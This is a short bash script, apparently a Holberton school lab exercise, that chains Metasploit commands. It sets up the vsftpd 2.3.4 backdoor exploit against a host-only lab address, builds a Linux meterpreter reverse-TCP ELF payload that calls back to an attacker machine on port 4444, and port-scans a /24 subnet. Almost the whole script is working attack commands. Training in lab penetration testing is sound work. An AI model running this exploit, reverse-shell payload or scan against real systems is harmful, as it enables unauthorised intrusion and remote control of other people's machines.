#!/bin/bash
# Metasploit Workflow - Holberton Project
# Author: Patrick

echo "[+] Metasploit Workflow Script"
echo ""

# Part 2: Configure exploit
echo "[*] Part 2: Configuring exploit..."
msfconsole -q -x "workspace holberton_project; use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.100; show options; exit"

# Part 3: Generate payload
echo "[*] Part 3: Generating payload..."
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=4444 -f elf -o payload.elf

# Part 4: Port scan
echo "[*] Part 4: Running port scan..."
msfconsole -q -x "workspace holberton_project; use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.56.0/24; set PORTS 21-25,80,443; set THREADS 20; run; exit"

echo "[âœ“] Workflow completed!"